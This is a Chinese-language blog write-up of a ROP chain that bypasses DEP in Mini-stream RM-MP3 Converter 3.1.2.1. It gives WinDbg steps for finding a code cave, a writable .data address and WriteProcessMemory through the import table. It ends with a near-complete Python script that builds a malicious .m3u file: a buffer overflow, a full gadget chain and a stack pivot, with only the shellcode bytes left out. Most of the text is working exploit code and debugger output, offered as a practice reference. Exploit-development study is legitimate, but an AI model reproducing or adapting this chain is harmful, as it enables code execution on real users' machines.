---
title: ROP with DEP bypass - Mini-stream RM-MP3 Converter 3.1.2.1
description: My second DEP bypass ROP WriteUp
date: 2025-12-14 01:00:00+0000
categories:
  - ROP
---

## 🦉0x00 前言

Hi，我希望你已經看過 syncbreezeent v10.0.28 的 ROP with DEP bypass 了。我在那一篇 WriteUp 中非常詳細的說明了 ROP 的過程。如果你還沒看過，非常推薦你去看看。至於這一篇 WriteUp 會非常簡短扼要，基本上我不會過多描述為什麼我要這樣做，如果你正好在練習這一題 ROP，只是需要找一個參考，我想這一篇 blog 會非常適合你。但如果你是想從頭學習 ROP，這一篇 blog 可能沒辦法幫助你太多。

---
## 🦉0x01 尋找 Code Cave

payload 模板。
```python
#!/usr/bin/python
import socket, sys
from struct import pack

def exploit():

    crash_offset = 17416
    eip = b"B"*4
    
    wpm = b""
    #wpm=pack("<L",0x69696969)   # WriteProcessMemory Address
    #wpm+=pack("<L",)  # Return Address after WPM
    #wpm+=pack("<L",0xFFFFFFFF)  # hProcess, -1
    #wpm+=pack("<L",)  # lpBaseAddress, Code Cave
    #wpm+=pack("<L",0x70707070)  # lpBuffer
    #wpm+=pack("<L",0x71717171)  # nSize
    #wpm+=pack("<L",)  # *lpNumberOfBytesWritten, .data
    
    rop = b""
    shellcode = b""
    
    junk = b'A' * (crash_offset-len(wpm))
    #payload = b"http://." + junk + eip + rop + shellcode
    payload = b"http://." + junk + eip + badchars
    
    payload += b"D" * (7572)
    
    writeFile = open ("crash.m3u", "wb")
    writeFile.write( payload )
    writeFile.close()


if __name__ == '__main__':
    exploit()
```

先找 PE Header。
```
0:013> dd MSRMfilter03 + 3c L1
1000003c  000000e8
```

找程式碼區段。
```
dd MSRMfilter03 + 2c + e8 L1
10000114  00001000
```

用 MSRMfilter03 的 base address 去計算相對位置。
```
? MSRMfilter03 + 1000
Evaluate expression: 268439552 = 10001000
```

確定該區塊有 RE 權限，並且 End Address 到 `0x1005d000`。
```shell
!address 10001000

Usage:                  Image
Base Address:           10001000
End Address:            1005d000
Region Size:            0005c000 ( 368.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000020          PAGE_EXECUTE_READ
Type:                   01000000          MEM_IMAGE
Allocation Base:        10000000
Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY
```

開始找 Code Cave
```
dd 1005d000-700

1005c900  00000000 00000000 00000000 00000000
```

- 00 是 badchar 所以 + 4
```shell
? 1005d000-700
Evaluate expression: 268814592 = 1005c900

? 1005d000-700 + 4
Evaluate expression: 268814596 = 1005c904
```
---
## 🦉0x02 尋找 lpNumberOfBytesWritten

找 .data 區段。
```shell
!dh -a MSRMfilter03

SECTION HEADER #3
   .data name
   22D9C virtual size
   66000 virtual address
   10000 size of raw data
   66000 file pointer to raw data
```

確認 address 中的內容沒有被使用，並且 AllocationProtect 是可寫的。
```shell
?MSRMfilter03+66000+22D9C+4
dd 10088da0
!vprot 10088da0
```
---
## 🦉0x03 尋找 WPM 在 IAT 的 address

找 IAT 的 offset
```shell
!dh -f MSRMfilter03

5D000 [     188] address [size] of Import Address Table Directory
```

抓一個倒楣鬼算 WPM 的 address。
```shell
dds MSRMfilter03 + 5D000
1005d014 77874030 KERNEL32!GetLastErrorStub
```

算 offset。
```
? KERNEL32!GetLastErrorStub - KERNEL32!WriteProcessMemoryStub
Evaluate expression: -129696 = fffe0560
```

GetLastErrorStub 在 `0x77874030`
```shell
u KERNEL32!GetLastErrorStub

KERNEL32!GetLastErrorStub:
77874030
```

取得 WPM 的 address。
```shell
? 77874030 + 0n129696
u 77893ad0

KERNEL32!WriteProcessMemoryStub:
```

捏出 writeprocessmemory 的骨架。
```python
wpm=pack("<L",0x69696969)   # WriteProcessMemory Address
wpm+=pack("<L",0x1005c904)  # Return Address after WPM
wpm+=pack("<L",0xFFFFFFFF)  # hProcess, -1
wpm+=pack("<L",0x1005c904)  # lpBaseAddress, Code Cave
wpm+=pack("<L",0x70707070)  # lpBuffer
wpm+=pack("<L",0x71717171)  # nSize, 0x700
wpm+=pack("<L",0x10088da0)  # *lpNumberOfBytesWritten, .data
```
---
## 🦉0x04 ROP

找 MSRMfilter03 的 base address。
```shell
.load narly
!nmod

10000000 1008d000 MSRMfilter03
```

用 rp-win32 來取得 gadget。
```shell
C:\Users\tonya\Desktop\ROP\rp-win32.exe -r 5 --va 0x10000000 --file "C:\Program Files\Mini-stream\Mini-stream RM-MP3 Converter\MSRMfilter03.dll" > rop5.txt
```

先把 esp 記錄下來。
```python
eip = pack("<L",0x10032d54) # push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret ;
```

透過 esp 取得 stack 的範圍。
```shell
r esp
!address esp
```

搜尋該範圍中 WPM 的佔位字元。
```shell
s -b 0e0000 150000 69 69 69 69
? esi - 000f5684
```

第一部分 ROP，指到 WriteProcessMemory Address，放 `edx` 備用。
```python
rop = pack("<L",0x100319d9) # ret ;
rop += pack("<L",0x1001217b) # push esi ; add al, 0x5E ; pop ebx ; ret ;
rop += pack("<L",0x10021b7e) # mov eax, ebx ; pop esi ; pop ebx ; ret ;
rop += pack("<L",0x74747474) # garbage for esi
rop += pack("<L",0x74747474) # garbage for ebx
rop += pack("<L",0x10020415) # pop ecx ; ret ;
rop += pack("<L",0xffff99d8) # -0x6628
rop += pack("<L",0x1001451e) # add eax, ecx ; ret ;
rop += pack("<L",0x10020415) # pop ecx ; ret ;
rop += pack("<L",0xffffffe0) # 
rop += pack("<L",0x10029930) # mov edx, eax ; xor eax, eax ; and cl, 0x1F ; shl edx, cl ; ret ;
```

第二部分 ROP，準備好 `-129696`，是從 GetLastErrorStub 到 WriteProcessMemoryStub 的差值，放 `ecx` 備用。
```python
rop += pack("<L",0x10020415) # pop ecx ; ret ;
rop += pack("<L",0xfffe0560) # -129696
```

第三部分 ROP，準備好 GetLastErrorStub 的 IAT address，由於是指標，所以要取出當中真正的 address，放到 skeleton 最頂部。
```python
print("[+] Put WPM Address into skeleton")
rop += pack("<L",0x1002f3af) # pop eax ; ret ;
rop += pack("<L",0x1005d014) # GetLastErrorStub
rop += pack("<L",0x10027f59) # mov eax,  [eax] ; ret ;
rop += pack("<L",0x1002c874) # sub eax, ecx ; ret ;
rop += pack("<L",0x10031e2e) # mov  [edx], eax ; mov eax, 0x00000003 ; ret ;
```

第四部份 ROP，跳過那些硬編碼的部分，讓 edx 指向 lpBuffer。
```python
print("[+] Move edx to skeleton of lpBuffer")
rop += pack("<L",0x10020415) # pop ecx ; ret ;
rop += pack("<L",0x10088da0) # garbage block as lpNumberOfBytesWritten

for i in range(0,16):
	rop += pack("<L",0x10028fdf) # inc edx ; std ; pop esi ; pop edi ; pop ebx ; ret ;
	rop += pack("<L",0x74747474) # garbage for esi
	rop += pack("<L",0x74747474) # garbage for edi
	rop += pack("<L",0x74747474) # garbage for ebx
```

確認已經就定位到 lpBuffer。
```shell
0:000> dd edx L1
000f5694  70707070
```

計算 skeleton 的 lpBuffer 距離 shell code 有多遠，先取得目前的 edx。
```shell
!address edx
```

查看當前的 stack 範圍，搜尋 shellcode 前 5 bytes。
```shell
s -b 000e0000 00150000 89 e5 81 c4 f0
000ed008
```

計算 offset，會隨著 ROP gadgets 堆疊而改變，後面需要再回來修正。
```shell
0:000> ? 000ed008 - edx
Evaluate expression: -34444 = ffff7974
```

確認 shellcode 的位置正確。
```
dd edx+ffff78f0
000ecf84  c481e589
```

第五部分 ROP，計算 edx 距離 shell code 有多遠，並且將 shell code 所在的 address 寫入 lpBuffer，之後 WPM 會從這個 address 把 shell code 寫入 Code Cave。
```python
print("[+] Put shellcode address to skeleton of lpBuffer")
rop += pack("<L",0x1002fa6a) # mov eax, edx ; ret ;
rop += pack("<L",0x10020415) # pop ecx ; ret ;
rop += pack("<L",0xffff7974) # -34444
rop += pack("<L",0x1001451e) # add eax, ecx ; ret ;
rop += pack("<L",0x10031e2e) # mov  [edx], eax ; mov eax, 0x00000003 ; ret ; (1 found)
```

第六部份 ROP，讓 edx 指向 nSize。
```python
print("[+] Move edx to skeleton of nSize")
rop += pack("<L",0x10020415) # pop ecx ; ret ;
rop += pack("<L",0x10088da0) # garbage block as lpNumberOfBytesWritten

for i in range(0,4):
	rop += pack("<L",0x10028fdf) # inc edx ; std ; pop esi ; pop edi ; pop ebx ; ret ;
	rop += pack("<L",0x74747474) # garbage for esi
	rop += pack("<L",0x74747474) # garbage for edi
	rop += pack("<L",0x74747474) # garbage for ebx
```

第七部分 ROP，把 nSize 放進去 skeleton 的 nSize。
```python
print("[+] Put shell code size to skeleton of nSize")
rop += pack("<L",0x1002f3af) # pop eax ; ret ;
rop += pack("<L",0xfffffd44) # -700
rop += pack("<L",0x1005b5db) # neg eax ; ret ;
rop += pack("<L",0x10031e2e) # mov  [edx], eax ; mov eax, 0x00000003 ; ret ; (1 found)
```

第八部分 ROP，將 skeleton 頂端的 address 放入 `esp` 中執行 WPM，可以用 `edx` 去找，但也能算，前面總共對 `edx` 動了 `20` 次，所以就減去 `0x14`。
```shell
print("[+] Set esp to WPM")
rop += pack("<L",0x1002fa6a) # mov eax, edx ; ret ;
rop += pack("<L",0x10020415) # pop ecx ; ret ;
rop += pack("<L",0xffffffec) # -0x14
rop += pack("<L",0x1001451e) # add eax, ecx ; ret ;
rop += pack("<L",0x1002fe81) # xchg eax, esp ; ret ;
```

最後記得回去修  lpBuffer。

---
## 🦉0x05 範例 Payload

```python
#!/usr/bin/python
import socket, sys
from struct import pack

# badchar : 00 09 0a

def exploit():

    crash_offset = 17416

    
    wpm = b""
    wpm+=pack("<L",0x69696969)   # WriteProcessMemory Address
    wpm+=pack("<L",0x1005c904)  # Return Address after WPM
    wpm+=pack("<L",0xFFFFFFFF)  # hProcess, -1
    wpm+=pack("<L",0x1005c904)  # lpBaseAddress, Code Cave
    wpm+=pack("<L",0x70707070)  # lpBuffer
    wpm+=pack("<L",0x71717171)  # nSize
    wpm+=pack("<L",0x10088da0)  # *lpNumberOfBytesWritten, .data
    
    
    junk = b'A' * (crash_offset-len(wpm))
    
    print("[+] Save ESP Address")
    eip = pack("<L",0x10032d54) # push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret ;
    
    print("[+] Get skeleton of WPM Address & put into edx")
    rop = pack("<L",0x100319d9) # ret ;
    rop += pack("<L",0x1001217b) # push esi ; add al, 0x5E ; pop ebx ; ret ;
    rop += pack("<L",0x10021b7e) # mov eax, ebx ; pop esi ; pop ebx ; ret ;
    rop += pack("<L",0x74747474) # garbage for esi
    rop += pack("<L",0x74747474) # garbage for ebx
    rop += pack("<L",0x10020415) # pop ecx ; ret ;
    rop += pack("<L",0xffff99d8) # -0x6628
    rop += pack("<L",0x1001451e) # add eax, ecx ; ret ;
    rop += pack("<L",0x10020415) # pop ecx ; ret ;
    rop += pack("<L",0xffffffe0) # 
    rop += pack("<L",0x10029930) # mov edx, eax ; xor eax, eax ; and cl, 0x1F ; shl edx, cl ; ret ;
    
    
    print("[+] Put GetLastErrorStub - WriteProcessMemoryStub")
    rop += pack("<L",0x10020415) # pop ecx ; ret ;
    rop += pack("<L",0xfffe0560) # -129696
    
    print("[+] Put WPM Address into skeleton")
    #rop += pack("<L",0x100319d9) # ret ;
    rop += pack("<L",0x1002f3af) # pop eax ; ret ;
    rop += pack("<L",0x1005d014) # GetLastErrorStub
    rop += pack("<L",0x10027f59) # mov eax,  [eax] ; ret ;
    rop += pack("<L",0x1002c874) # sub eax, ecx ; ret ;
    rop += pack("<L",0x10031e2e) # mov  [edx], eax ; mov eax, 0x00000003 ; ret ;
    
    print("[+] Move edx to skeleton of lpBuffer")
    rop += pack("<L",0x10020415) # pop ecx ; ret ;
    rop += pack("<L",0x10088da0) # garbage block as lpNumberOfBytesWritten

    for i in range(0,16):
        rop += pack("<L",0x10028fdf) # inc edx ; std ; pop esi ; pop edi ; pop ebx ; ret ;
        rop += pack("<L",0x74747474) # garbage for esi
        rop += pack("<L",0x74747474) # garbage for edi
        rop += pack("<L",0x74747474) # garbage for ebx
    
    print("[+] Put shellcode address to skeleton of lpBuffer")
    rop += pack("<L",0x100319d9) # ret ;
    rop += pack("<L",0x1002fa6a) # mov eax, edx ; ret ;
    rop += pack("<L",0x10020415) # pop ecx ; ret ;
    rop += pack("<L",0xffff7974) # -34444
    rop += pack("<L",0x1001451e) # add eax, ecx ; ret ;
    rop += pack("<L",0x10031e2e) # mov  [edx], eax ; mov eax, 0x00000003 ; ret ; (1 found)
    
    print("[+] Move edx to skeleton of nSize")
    rop += pack("<L",0x10020415) # pop ecx ; ret ;
    rop += pack("<L",0x10088da0) # garbage block as lpNumberOfBytesWritten

    for i in range(0,4):
        rop += pack("<L",0x10028fdf) # inc edx ; std ; pop esi ; pop edi ; pop ebx ; ret ;
        rop += pack("<L",0x74747474) # garbage for esi
        rop += pack("<L",0x74747474) # garbage for edi
        rop += pack("<L",0x74747474) # garbage for ebx
    
    print("[+] Put shell code size to skeleton of nSize")
    rop += pack("<L",0x1002f3af) # pop eax ; ret ;
    rop += pack("<L",0xfffffd44) # -700
    rop += pack("<L",0x1005b5db) # neg eax ; ret ;
    rop += pack("<L",0x10031e2e) # mov  [edx], eax ; mov eax, 0x00000003 ; ret ; (1 found)
    
    
    print("[+] Set esp to WPM")
    rop += pack("<L",0x1002fa6a) # mov eax, edx ; ret ;
    rop += pack("<L",0x10020415) # pop ecx ; ret ;
    rop += pack("<L",0xffffffec) # -0x14
    rop += pack("<L",0x1001451e) # add eax, ecx ; ret ;
    rop += pack("<L",0x1002fe81) # xchg eax, esp ; ret ;
    rop += pack("<L",0x100319d9) # ret ;
    #rop += pack("<L",0x100319d9) # ret ;
    
    
    shellcode=b"\x89\xe5\x81\xc4\xf0..."
    
    payload = b"http://." + junk + wpm + eip + rop + shellcode
    #payload = b"http://." + junk + eip + badchars
    
    payload += b"D" * (7572-len(eip)-len(rop)-len(shellcode))
    
    writeFile = open ("crash.m3u", "wb")
    writeFile.write( payload )
    writeFile.close()

if __name__ == '__main__':
    exploit()
```


